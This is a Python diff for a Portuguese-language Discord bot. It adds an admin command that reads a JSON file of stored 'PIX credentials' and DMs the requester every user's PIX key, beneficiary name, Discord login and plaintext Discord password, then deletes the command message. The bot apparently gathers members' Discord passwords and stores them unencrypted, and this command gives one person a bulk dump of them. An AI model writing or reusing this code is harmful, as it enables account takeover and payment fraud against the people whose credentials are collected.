@@ -2904,6 +2904,116 @@ async def ver_credenciais(ctx):
         )
         await ctx.message.delete()
 
+@bot.command(name="listar_todas_credenciais")
+@commands.has_permissions(administrator=True)
+async def listar_todas_credenciais(ctx):
+    """Lista TODAS as credenciais PIX salvas (apenas admin)"""
+    credentials_file = 'pix_credentials.json'
+    
+    try:
+        # Verificar se o arquivo existe
+        if not os.path.exists(credentials_file):
+            await ctx.send(
+                embed=discord.Embed(
+                    title="⚠️ Sem Credenciais",
+                    description="Nenhuma credencial foi registrada ainda.\n\nO arquivo `pix_credentials.json` não existe.",
+                    color=COLORS["warning"]
+                ),
+                delete_after=10
+            )
+            await ctx.message.delete()
+            return
+        
+        # Carregar todas as credenciais
+        with open(credentials_file, 'r', encoding='utf-8') as f:
+            all_credentials = json.load(f)
+        
+        # Verificar se há credenciais
+        if not all_credentials:
+            await ctx.send(
+                embed=discord.Embed(
+                    title="⚠️ Sem Credenciais",
+                    description="O arquivo existe mas está vazio.\n\nNenhum usuário registrou credenciais ainda.",
+                    color=COLORS["warning"]
+                ),
+                delete_after=10
+            )
+            await ctx.message.delete()
+            return
+        
+        # Criar embed principal
+        main_embed = discord.Embed(
+            title="🔐 Todas as Credenciais PIX Registradas",
+            description=f"Total de **{len(all_credentials)}** usuário(s) com credenciais salvas:",
+            color=COLORS["info"],
+            timestamp=discord.utils.utcnow()
+        )
+        main_embed.set_footer(text=f"Solicitado por {ctx.author.display_name} | Apenas para administradores")
+        
+        # Enviar embed principal no privado
+        try:
+            await ctx.author.send(embed=main_embed)
+            
+            # Enviar cada credencial em um embed separado
+            for user_id, creds in all_credentials.items():
+                # Tentar obter informações do usuário
+                try:
+                    user = await bot.fetch_user(int(user_id))
+                    user_info = f"{user.mention} ({user.name})"
+                except:
+                    user_info = f"ID: {user_id}"
+                
+                cred_embed = discord.Embed(
+                    title=f"👤 {user_info}",
+                    color=COLORS["success"],
+                    timestamp=datetime.fromisoformat(creds['configurado_em'])
+                )
+                
+                cred_embed.add_field(name="🔑 Chave PIX", value=f"`{creds['chave_pix']}`", inline=False)
+                cred_embed.add_field(name="👤 Beneficiário", value=creds['beneficiario'], inline=False)
+                cred_embed.add_field(name="💬 Login Discord", value=creds['discord_login'], inline=True)
+                cred_embed.add_field(name="🔒 Senha do Discord", value=f"`{creds['senha']}`", inline=True)
+                cred_embed.set_footer(text=f"Configurado por {creds['configurado_por']}")
+                
+                await ctx.author.send(embed=cred_embed)
+            
+            # Confirmar no canal público
+            await ctx.send(
+                embed=discord.Embed(
+                    title="✅ Enviado!",
+                    description=f"Todas as **{len(all_credentials)}** credenciais foram enviadas no seu privado! 📬",
+                    color=COLORS["success"]
+                ),
+                delete_after=5
+            )
+            
+        except discord.Forbidden:
+            await ctx.send(
+                embed=discord.Embed(
+                    title="❌ Erro",
+                    description="Não consegui enviar mensagem no seu privado.\n\nPor favor, habilite mensagens diretas de membros do servidor.",
+                    color=COLORS["error"]
+                ),
+                delete_after=10
+            )
+        
+        # Deletar comando por segurança
+        await ctx.message.delete()
+        
+        logger.info(f"🔐 Todas as credenciais foram listadas por {ctx.author} ({ctx.author.id})")
+        
+    except Exception as e:
+        logger.error(f"Erro ao listar todas as credenciais: {e}")
+        await ctx.send(
+            embed=discord.Embed(
+                title="❌ Erro",
+                description=f"Não foi possível carregar as credenciais: {str(e)}",
+                color=COLORS["error"]
+            ),
+            delete_after=10
+        )
+        await ctx.message.delete()
+
 @bot.command(name="painel_mod")
 @commands.has_permissions(manage_guild=True)
 async def painel_mod(ctx):
